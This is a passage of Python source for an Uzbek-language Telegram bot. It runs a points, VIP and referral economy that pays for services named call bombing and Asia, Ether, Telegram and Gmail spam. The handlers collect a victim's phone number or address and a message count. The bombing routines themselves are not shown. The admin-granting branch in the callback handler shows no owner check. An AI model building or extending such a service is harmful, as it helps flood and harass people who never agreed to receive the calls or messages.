# ========== Bot buyruqlari ==========
async def add_points_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Bu buyruq faqat adminlar uchun!")
        return
    try:
        target = int(context.args[0])
        points = int(context.args[1])
        update_user_points(target, points)
        points_after = get_user_points(target)
        
        if points > 0:
            msg = f"✅ {target} foydalanuvchisiga {points} ball qo'shildi\n💎 Hozirgi balans: {points_after} ball"
        elif points < 0:
            msg = f"⚠️ {target} foydalanuvchisidan {abs(points)} ball ayirildi\n💎 Hozirgi balans: {points_after} ball"
        else:
            msg = f"ℹ️ {target} foydalanuvchisining balansi o'zgarmadi"
        
        await update.message.reply_text(msg)
        try:
            await context.bot.send_message(target, f"🎁 Hisobingizga {'qoshildi' if points > 0 else 'ayirildi'} {abs(points)} ball!\n💎 Hozirgi balansingiz: {points_after} ball")
        except:
            pass
    except:
        await update.message.reply_text("❌ Buyruq: `/add_points <id> <ball>`\n\n📝 Misol: `/add_points 123456789 10`")

async def add_vip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Bu buyruq faqat adminlar uchun!")
        return
    try:
        target = int(context.args[0])
        days = int(context.args[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('UPDATE users SET is_vip = 1, vip_expiry = ? WHERE user_id = ?', (expiry, target))
            conn.commit()
            conn.close()
        await update.message.reply_text(f"✅ {target} foydalanuvchisi {days} kunga VIP qilindi")
        try:
            await context.bot.send_message(target, f"👑 Siz VIP bo'ldingiz!\n\n✅ Cheksiz urinishlar\n✅ Barcha xizmatlar mavjud\n\n{days} kun muddatga")
        except:
            pass
    except:
        await update.message.reply_text("❌ Buyruq: `/add_vip <id> <kun>`\n\n📝 Misol: `/add_vip 123456789 7`")

async def set_limit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Bu buyruq faqat bot egasi uchun!")
        return
    try:
        service = context.args[0]
        limit = int(context.args[1])
        if service not in ["call", "spam_asia", "spam_ether", "spam_telegram", "spam_email"]:
            await update.message.reply_text("❌ Noto'g'ri xizmat!\nMavjud xizmatlar: call, spam_asia, spam_ether, spam_telegram, spam_email")
            return
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute(f'UPDATE settings SET value = ? WHERE key = "limit_{service}"', (str(limit),))
            conn.commit()
            conn.close()
            DEFAULT_LIMITS[service] = limit
        await update.message.reply_text(f"✅ {service} xizmati uchun kunlik limit {limit} ga o'zgartirildi")
    except:
        await update.message.reply_text("❌ Buyruq: `/setlimit <xizmat> <son>`\n\n📝 Misol: `/setlimit call 10`")

async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = get_referral_code(user_id)
    bot_username = context.bot.username
    link = f"https://t.me/{bot_username}?start=ref_{code}"
    points = get_user_points(user_id)
    referrals = get_referral_count(user_id)
    clicks, registered = get_referral_stats(user_id)
    
    await update.message.reply_text(
        f"✦ • ───────────────── • ✦\n"
        f"🔗 *Sizning taklif havolangiz* 🔗\n"
        f"✦ • ───────────────── • ✦\n\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃ 💎 Ballaringiz: {points}\n"
        f"┃ 👥 Taklif qilinganlar: {referrals}\n"
        f"┃ 🔗 Havolangiz tashriflari: {clicks}\n"
        f"┃ 📝 Ro'yxatdan o'tganlar: {registered}\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"🔗 Havolangiz:\n`{link}`\n\n"
        f"✨ Har bir ro'yxatdan o'tgan foydalanuvchi sizga *1 ball* beradi",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Havolani ulashish", url=f"https://t.me/share/url?url={link}&text=🚀 Bu ajoyibotga qo'shiling!")]])
    )

# ========== Xabar yuborish ==========
async def broadcast_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['broadcast_type'] = update.callback_query.data
    context.user_data['wait_broadcast'] = True
    context.user_data['broadcast_step'] = 'waiting_message'
    
    if update.callback_query.data == 'broadcast_private':
        await update.callback_query.edit_message_text(
            f"🔒 *Shaxsiy xabar*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ Foydalanuvchi ID sini yuboring\n"
            f"┃ 2️⃣ Keyin xabarni yuboring\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📝 *Foydalanuvchi ID sini yuboring:*\n"
            f"Misol: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Bekor qilish", callback_data="admin_panel")]]),
            parse_mode='Markdown'
        )
    else:
        await update.callback_query.edit_message_text(
            f"📢 *Umumiy xabar*\n\n"
            f"Matn, rasm yoki video yuborishingiz mumkin\n\n"
            f"⚠️ Barcha foydalanuvchilarga yuboriladi",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Bekor qilish", callback_data="admin_panel")]]),
            parse_mode='Markdown'
        )

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('wait_broadcast'):
        return
    
    btype = context.user_data['broadcast_type']
    step = context.user_data.get('broadcast_step', 'waiting_message')
    
    if btype == 'broadcast_private' and step == 'waiting_user':
        try:
            target_id = int(update.message.text.strip())
            context.user_data['broadcast_target'] = target_id
            context.user_data['broadcast_step'] = 'waiting_message'
            await update.message.reply_text(f"✅ Foydalanuvchi aniqlandi: {target_id}\n\n📝 Endi xabarni yuboring:")
        except:
            await update.message.reply_text("❌ To'g'ri raqamli ID yuboring!")
        return
    
    if btype == 'broadcast_private':
        target_id = context.user_data.get('broadcast_target')
        if not target_id:
            await update.message.reply_text("❌ Foydalanuvchi aniqlanmadi")
            context.user_data['wait_broadcast'] = False
            return
        
        try:
            if update.message.text:
                await context.bot.send_message(target_id, update.message.text)
            elif update.message.photo:
                await context.bot.send_photo(target_id, update.message.photo[-1].file_id, caption=update.message.caption)
            elif update.message.video:
                await context.bot.send_video(target_id, update.message.video.file_id, caption=update.message.caption)
            else:
                await context.bot.send_message(target_id, "📢 Admin xabari")
            await update.message.reply_text(f"✅ Xabar {target_id} ga yuborildi")
        except Exception as e:
            await update.message.reply_text(f"❌ Yuborilmadi: {str(e)[:100]}")
        
        context.user_data['wait_broadcast'] = False
        context.user_data['broadcast_step'] = None
        return
    
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        if btype == 'broadcast_all':
            c.execute('SELECT user_id FROM users')
        else:
            c.execute('SELECT user_id FROM users WHERE is_vip = 1')
        users = c.fetchall()
        conn.close()
    
    msg = await update.message.reply_text(f"📨 {len(users)} ta foydalanuvchiga yuborilmoqda...")
    success = 0
    fail = 0
    
    for user in users:
        try:
            if update.message.text:
                await context.bot.send_message(user[0], update.message.text)
            elif update.message.photo:
                await context.bot.send_photo(user[0], update.message.photo[-1].file_id, caption=update.message.caption)
            elif update.message.video:
                await context.bot.send_video(user[0], update.message.video.file_id, caption=update.message.caption)
            else:
                await context.bot.send_message(user[0], "📢 Admin xabari")
            success += 1
            await asyncio.sleep(0.03)
        except:
            fail += 1
    
    await msg.edit_text(f"✅ Xabar yuborildi!\n\n📨 Yuborildi: {success} ta\n❌ Yuborilmadi: {fail} ta")
    context.user_data['wait_broadcast'] = False

# ========== Tugmalarni boshqarish ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        data = query.data
        
        if data == "services_menu":
            await services_menu(update, context)
        elif data == "show_balance":
            await show_balance(update, context)
        elif data == "earn_points":
            await earn_points(update, context)
        elif data == "my_info":
            await my_info(update, context)
        elif data == "transfer_menu":
            await transfer_menu(update, context)
        elif data == "transfer_points":
            await transfer_points(update, context)
        elif data == "transfer_service_menu":
            await transfer_service_menu(update, context)
        elif data == "back_main":
            await back_main(update, context)
        elif data == "call_menu":
            await call_menu_func(update, context)
        elif data == "spam_asia_menu":
            await spam_menu_generic(update, context, 'asia', 'Osiyo spami', "🌏")
        elif data == "spam_ether_menu":
            await spam_menu_generic(update, context, 'ether', 'Ether spami', "🔥")
        elif data == "spam_telegram_menu":
            await spam_menu_generic(update, context, 'telegram', 'Telegram spami', "📱")
        elif data == "spam_email_menu":
            await spam_menu_generic(update, context, 'email', 'Gmail spami', "✉️")
        elif data == "redeem_menu":
            await redeem_menu(update, context)
        elif data.startswith("redeem_"):
            await redeem_service(update, context)
        elif data == "vip_menu":
            await vip_menu_func(update, context)
        elif data == "admin_panel":
            await admin_panel_func(update, context)
        elif data == "owner_panel":
            await owner_panel_func(update, context)
        elif data == "admin_stats":
            await admin_stats_func(update, context)
        elif data == "add_points_admin":
            await add_points_admin_func(update, context)
        elif data == "add_vip_admin":
            await add_vip_admin_func(update, context)
        elif data == "toggle_call":
            await toggle_call(update, context)
        elif data == "toggle_asia":
            await toggle_asia(update, context)
        elif data == "toggle_ether":
            await toggle_ether(update, context)
        elif data == "toggle_telegram":
            await toggle_telegram(update, context)
        elif data == "toggle_email":
            await toggle_email(update, context)
        elif data == "toggle_referral":
            await toggle_referral(update, context)
        elif data == "edit_limits":
            await edit_limits(update, context)
        elif data == "owner_add_admin":
            context.user_data['wait_admin'] = True
            await query.edit_message_text(
                f"✦ • ───────────────── • ✦\n"
                f"👑 *Foydalanuvchini admin qilish* 👑\n"
                f"✦ • ───────────────── • ✦\n\n"
                f"📝 *Foydalanuvchi ID sini yuboring*\n"
                f"Misol: 123456789\n\n"
                f"⚠️ Foydalanuvchi darhol admin bo'ladi",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bekor qilish", callback_data="owner_panel")]]),
                parse_mode='Markdown'
            )
        elif data == "owner_remove_admin":
            context.user_data['wait_remove_admin'] = True
            await query.edit_message_text(
                f"✦ • ───────────────── • ✦\n"
                f"📉 *Foydalanuvchini adminlikdan chiqarish* 📉\n"
                f"✦ • ───────────────── • ✦\n\n"
                f"📝 *Foydalanuvchi ID sini yuboring*\n"
                f"Misol: 123456789\n\n"
                f"⚠️ Foydalanuvchi adminlikdan chiqariladi",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bekor qilish", callback_data="owner_panel")]]),
                parse_mode='Markdown'
            )
        elif data == "owner_add_channel":
            context.user_data['wait_channel'] = True
            await query.edit_message_text(
                f"✦ • ───────────────── • ✦\n"
                f"🔗 *Majburiy kanal qo'shish* 🔗\n"
                f"✦ • ───────────────── • ✦\n\n"
                f"📝 *Kanal username sini yuboring*\n"
                f"Misol: @kanal\n\n"
                f"⚠️ *Muhim eslatmalar:*\n"
                f"• Botni kanalda admin qiling\n"
                f"• Men ruxsatlarni tekshiraman\n"
                f"• Agar muvaffaqiyatli bo'lsa, sizga xabar beraman",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bekor qilish", callback_data="owner_panel")]]),
                parse_mode='Markdown'
            )
        elif data == "owner_remove_channel":
            with db_lock:
                conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT channel_username FROM force_channels')
                channels = c.fetchall()
                conn.close()
            if not channels:
                await query.edit_message_text("❌ Kanallar mavjud emas", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="owner_panel")]]))
                return
            kb = [[InlineKeyboardButton(f"❌ @{ch[0]}", callback_data=f"del_{ch[0]}")] for ch in channels]
            kb.append([InlineKeyboardButton("🔙 Orqaga", callback_data="owner_panel")])
            await query.edit_message_text("O'chirish uchun kanalni tanlang:", reply_markup=InlineKeyboardMarkup(kb))
        elif data.startswith("del_"):
            channel = data.replace("del_", "")
            with db_lock:
                conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM force_channels WHERE channel_username = ?', (channel,))
                conn.commit()
                conn.close()
            await query.answer(f"✅ @{channel} o'chirildi")
            await owner_panel_func(update, context)
        elif data == "check_sub":
            ok, ch = await check_channel(query.from_user.id, context)
            if ok:
                await show_main_menu(query.message, query.from_user.id, context)
            else:
                keyboard = [[InlineKeyboardButton("📢 A'zo bo'lish", url=f"https://t.me/{ch}")], [InlineKeyboardButton("✅ Tekshirish", callback_data="check_sub")]]
                await query.edit_message_text(f"⚠️ Avval @{ch} kanaliga a'zo bo'ling", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data.startswith("broadcast_"):
            await broadcast_menu(update, context)
        
        elif context.user_data.get('wait_admin'):
            try:
                target = int(data)
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (target,))
                    conn.commit()
                    conn.close()
                await query.edit_message_text(f"✅ {target} admin qilindi", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="owner_panel")]]))
                context.user_data['wait_admin'] = False
            except:
                await query.edit_message_text("❌ Xatolik! To'g'ri raqamli ID yuboring")
        elif context.user_data.get('wait_remove_admin'):
            try:
                target = int(data)
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (target,))
                    conn.commit()
                    conn.close()
                await query.edit_message_text(f"✅ {target} adminlikdan chiqarildi", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="owner_panel")]]))
                context.user_data['wait_remove_admin'] = False
            except:
                await query.edit_message_text("❌ Xatolik! To'g'ri raqamli ID yuboring")
        elif context.user_data.get('wait_channel'):
            username = data.replace('@', '')
            try:
                chat = await context.bot.get_chat(f"@{username}")
                bot_member = await context.bot.get_chat_member(chat.id, context.bot.id)
                if bot_member.status not in ['administrator', 'creator']:
                    await query.edit_message_text(
                        f"❌ *Kanal qo'shilmadi!*\n\n"
                        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        f"┃ Sabab: Bot @{username} da admin emas\n"
                        f"┃ Yechim: Botni kanalda admin qiling\n"
                        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="owner_panel")]]),
                        parse_mode='Markdown'
                    )
                    return
                
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('INSERT OR REPLACE INTO force_channels (channel_id, channel_username) VALUES (?, ?)', (str(chat.id), username))
                    conn.commit()
                    conn.close()
                
                await query.edit_message_text(
                    f"✅ *Kanal muvaffaqiyatli qo'shildi!*\n\n"
                    f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃ 📢 Kanal: @{username}\n"
                    f"┃ ✅ Bot ruxsatlari tekshirildi\n"
                    f"┃ ⚠️ Endi foydalanuvchilar kanalga a'zo bo'lishi kerak\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="owner_panel")]]),
                    parse_mode='Markdown'
                )
                context.user_data['wait_channel'] = False
            except Exception as e:
                await query.edit_message_text(
                    f"❌ *Kanal qo'shilmadi!*\n\n"
                    f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃ Sabab: {str(e)[:50]}\n"
                    f"┃ Yechim: Kanal username sini tekshiring\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="owner_panel")]]),
                    parse_mode='Markdown'
                )
    except Exception as e:
        logger.error(f"Tugma boshqaruvida xatolik: {e}")

# ========== Xabar boshqaruvi ==========
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # ===== Admin qilish va kanal qo'shishni boshqarish =====
        if context.user_data.get('wait_admin'):
            try:
                target = int(update.message.text.strip())
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (target,))
                    conn.commit()
                    conn.close()
                await update.message.reply_text(f"✅ `{target}` admin qilindi!", parse_mode='Markdown')
                context.user_data['wait_admin'] = False
                return
            except:
                await update.message.reply_text("❌ Xatolik! To'g'ri raqamli ID yuboring")
                return
        
        if context.user_data.get('wait_remove_admin'):
            try:
                target = int(update.message.text.strip())
                if target in OWNER_IDS:
                    await update.message.reply_text("❌ Egasi adminlikdan chiqarilmaydi!")
                    return
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (target,))
                    conn.commit()
                    conn.close()
                await update.message.reply_text(f"✅ `{target}` adminlikdan chiqarildi!", parse_mode='Markdown')
                context.user_data['wait_remove_admin'] = False
                return
            except:
                await update.message.reply_text("❌ Xatolik! To'g'ri raqamli ID yuboring")
                return
        
        if context.user_data.get('wait_channel'):
            username = update.message.text.strip().replace('@', '')
            try:
                chat = await context.bot.get_chat(f"@{username}")
                bot_member = await context.bot.get_chat_member(chat.id, context.bot.id)
                if bot_member.status not in ['administrator', 'creator']:
                    await update.message.reply_text(
                        f"❌ *Kanal qo'shilmadi!*\n\n"
                        f"Sabab: Bot @{username} da admin emas\n"
                        f"Yechim: Botni kanalda admin qiling va qayta urining",
                        parse_mode='Markdown'
                    )
                    return
                
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('INSERT OR REPLACE INTO force_channels (channel_id, channel_username) VALUES (?, ?)', (str(chat.id), username))
                    conn.commit()
                    conn.close()
                
                await update.message.reply_text(
                    f"✅ *Kanal muvaffaqiyatli qo'shildi!*\n\n"
                    f"📢 Kanal: @{username}\n"
                    f"✅ Bot ruxsatlari tekshirildi\n"
                    f"⚠️ Endi bot foydalanuvchilardan kanalga a'zo bo'lishni talab qiladi",
                    parse_mode='Markdown'
                )
                context.user_data['wait_channel'] = False
                return
            except Exception as e:
                await update.message.reply_text(
                    f"❌ *Kanal qo'shilmadi!*\n\n"
                    f"Sabab: {str(e)[:100]}\n"
                    f"Yechim: Kanal username sini tekshiring va bot admin ekanligiga ishonch hosil qiling",
                    parse_mode='Markdown'
                )
                return
        
        # ===== Qolgan xabarlarni boshqarish =====
        if context.user_data.get('call_step') == 'waiting_phone':
            await get_call_phone(update, context)
        elif context.user_data.get('spam_step') == 'waiting_target':
            await get_spam_target(update, context)
        elif context.user_data.get('spam_step') == 'waiting_count':
            await get_spam_count_execute(update, context)
        elif context.user_data.get('spam_need_message'):
            await get_asia_message(update, context)
        elif context.user_data.get('transfer_step') in ['waiting_id', 'waiting_amount', 'waiting_service_id', 'waiting_service_amount']:
            await handle_transfer(update, context)
        elif context.user_data.get('wait_broadcast'):
            await send_broadcast(update, context)
    except Exception as e:
        logger.error(f"Xabar boshqaruvida xatolik: {e}")

# Qolgan o'tkazish funksiyalari
async def handle_transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        step = context.user_data.get('transfer_step')
        
        if step == 'waiting_id':
            try:
                target_id = int(update.message.text.strip())
                if target_id == update.effective_user.id:
                    await update.message.reply_text("❌ O'zingizga o'tkaza olmaysiz!")
                    return
                context.user_data['transfer_target'] = target_id
                context.user_data['transfer_step'] = 'waiting_amount'
                await update.message.reply_text(f"🔄 *Ball o'tkazish*\n\n👤 Qabul qiluvchi: {target_id}\n📝 *Ballar sonini yuboring:*\n\n⚠️ Minimal: 1 ball", parse_mode='Markdown')
            except:
                await update.message.reply_text("❌ Foydalanuvchi ID si noto'g'ri!")
        elif step == 'waiting_amount':
            try:
                amount = int(update.message.text.strip())
                if amount < 1:
                    await update.message.reply_text("❌ Minimal 1 ball")
                    return
                user_id = update.effective_user.id
                points = get_user_points(user_id)
                if points < amount:
                    await update.message.reply_text(f"❌ Ballar yetarli emas!\nBalans: {points} ball\nKerak: {amount} ball")
                    return
                target_id = context.user_data['transfer_target']
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Qabul qilish", callback_data=f"accept_{user_id}_{target_id}_{amount}"),
                     InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_{user_id}_{target_id}_{amount}")]
                ])
                await context.bot.send_message(target_id, f"🔄 *Ball o'tkazish so'rovi*\n\n👤 Foydalanuvchi {user_id} sizga {amount} ball o'tkazmoqchi\n\nQabul qilasizmi?", reply_markup=keyboard, parse_mode='Markdown')
                await update.message.reply_text(f"✅ *O'tkazish so'rovi yuborildi!*\n\n👤 Qabul qiluvchi: {target_id}\n💰 Miqdor: {amount} ball\n\n⏳ Foydalanuvchi javob kutilmoqda...", parse_mode='Markdown')
                context.user_data['transfer_step'] = None
            except:
                await update.message.reply_text("❌ Ballar soni noto'g'ri!")
        elif step == 'waiting_service_id':
            try:
                target_id = int(update.message.text.strip())
                if target_id == update.effective_user.id:
                    await update.message.reply_text("❌ O'zingizga o'tkaza olmaysiz!")
                    return
                context.user_data['transfer_target'] = target_id
                context.user_data['transfer_step'] = 'waiting_service_type'
                keyboard = [
                    [InlineKeyboardButton("📞 Qo'ng'iroq", callback_data="transfer_service_call")],
                    [InlineKeyboardButton("🌏 Osiyo spami", callback_data="transfer_service_asia")],
                    [InlineKeyboardButton("🔥 Ether spami", callback_data="transfer_service_ether")],
                    [InlineKeyboardButton("📱 Telegram spami", callback_data="transfer_service_telegram")],
                    [InlineKeyboardButton("✉️ Gmail spami", callback_data="transfer_service_email")],
                    [InlineKeyboardButton("🔙 Bekor qilish", callback_data="transfer_menu")]
                ]
                await update.message.reply_text(f"💎 *Ballarni xizmatga o'tkazish*\n\n👤 Qabul qiluvchi: {target_id}\n\n📌 *Xizmatni tanlang:*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            except:
                await update.message.reply_text("❌ Foydalanuvchi ID si noto'g'ri!")
        elif step == 'waiting_service_amount':
            try:
                amount = int(update.message.text.strip())
                if amount < 1:
                    await update.message.reply_text("❌ Minimal 1 ball")
                    return
                user_id = update.effective_user.id
                points = get_user_points(user_id)
                if points < amount:
                    await update.message.reply_text(f"❌ Ballar yetarli emas!\nBalans: {points} ball\nKerak: {amount} ball")
                    return
                target_id = context.user_data['transfer_target']
                update_user_points(user_id, -amount)
                update_user_points(target_id, amount)
                service = context.user_data.get('transfer_service_type', 'call')
                service_names = {"call": "Qo'ng'iroq", "asia": "Osiyo spami", "ether": "Ether spami", "telegram": "Telegram spami", "email": "Gmail spami"}
                await update.message.reply_text(f"✅ *{amount} ball muvaffaqiyatli o'tkazildi!*\n\n👤 Foydalanuvchi: {target_id}\n📞 Xizmat: {service_names.get(service, service)}", parse_mode='Markdown')
                try:
                    await context.bot.send_message(target_id, f"🎁 *Yangi ballar qabul qilindi!*\n\n👤 Foydalanuvchi {user_id} dan\n💰 Miqdor: {amount} ball\n📞 Xizmat: {service_names.get(service, service)}")
                except:
                    pass
                context.user_data['transfer_step'] = None
            except:
                await update.message.reply_text("❌ Ballar soni noto'g'ri!")
    except Exception as e:
        logger.error(f"O'tkazishni boshqarishda xatolik: {e}")

async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        data = query.data
        
        if data.startswith("transfer_service_"):
            service = data.replace("transfer_service_", "")
            context.user_data['transfer_service_type'] = service
            context.user_data['transfer_step'] = 'waiting_service_amount'
            service_names = {"call": "Qo'ng'iroq", "asia": "Osiyo spami", "ether": "Ether spami", "telegram": "Telegram spami", "email": "Gmail spami"}
            await query.edit_message_text(f"💎 *Ballarni {service_names.get(service, service)} xizmatiga o'tkazish*\n\n👤 Qabul qiluvchi: {context.user_data.get('transfer_target')}\n\n📝 *O'tkazmoqchi bo'lgan ballar sonini yuboring:*\n\n⚠️ Minimal: 1 ball", parse_mode='Markdown')
            return
        
        parts = data.split('_')
        if len(parts) != 4:
            await query.answer("Ma'lumotlarda xatolik", show_alert=True)
            return
        
        action = parts[0]
        from_user = int(parts[1])
        to_user = int(parts[2])
        amount = int(parts[3])
        
        if to_user != query.from_user.id:
            await query.answer("Bu so'rov sizga tegishli emas!", show_alert=True)
            return
        
        if action == "accept":
            from_points = get_user_points(from_user)
            if from_points < amount:
                await query.edit_message_text("❌ Yuboruvchida ballar yetarli emas!")
                return
            update_user_points(from_user, -amount)
            update_user_points(to_user, amount)
            await query.edit_message_text(f"✅ *O'tkazish qabul qilindi!*\n\n💰 Hisobingizga {amount} ball qo'shildi\n💎 Yangi balans: {get_user_points(to_user)} ball", parse_mode='Markdown')
            try:
                await context.bot.send_message(from_user, f"✅ {to_user} foydalanuvchisi {amount} ball o'tkazmani qabul qildi")
            except:
                pass
        else:
            await query.edit_message_text(f"❌ *O'tkazish rad etildi*", parse_mode='Markdown')
            try:
                await context.bot.send_message(from_user, f"❌ {to_user} foydalanuvchisi {amount} ball o'tkazmani rad etdi")
            except:
                pass
        await query.answer()
    except Exception as e:
        logger.error(f"O'tkazish tugmasida xatolik: {e}")

# ========== Flask endpointlar ==========
@flask_app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'bot': 'Telz Bot Service',
        'version': '2.0',
        'uptime': '24/7'
    })

@flask_app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'database': 'connected'
    })

# ========== Botni ishga tushirish ==========
def run_bot():
    """Botni alohida threadda ishga tushirish"""
    while True:
        try:
            reset_daily_limits()
            app = Application.builder().token(TOKEN).connect_timeout(30).read_timeout(30).build()
            
            app.add_handler(CommandHandler("start", start))
            app.add_handler(CommandHandler("referral", referral_command))
            app.add_handler(CommandHandler("add_points", add_points_command))
            app.add_handler(CommandHandler("add_vip", add_vip_command))
            app.add_handler(CommandHandler("setlimit", set_limit_command))
            app.add_handler(CallbackQueryHandler(callback_handler))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
            app.add_handler(MessageHandler(filters.PHOTO, handle_messages))
            app.add_handler(MessageHandler(filters.VIDEO, handle_messages))
            
            logger.info("🚀 Bot ishga tushdi!")
            app.run_polling(allowed_updates=Update.ALL_TYPES)
        except Exception as e:
            logger.error(f"Bot xatosi: {e}")
            time.sleep(5)

# ========== Asosiy ==========
if __name__ == "__main__":
    # Botni alohida threadda ishga tushirish
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Flask serverini ishga tushirish
    port = int(os.environ.get('PORT', 5000))
    flask_app.run(host='0.0.0.0', port=port, debug=False, threaded=True)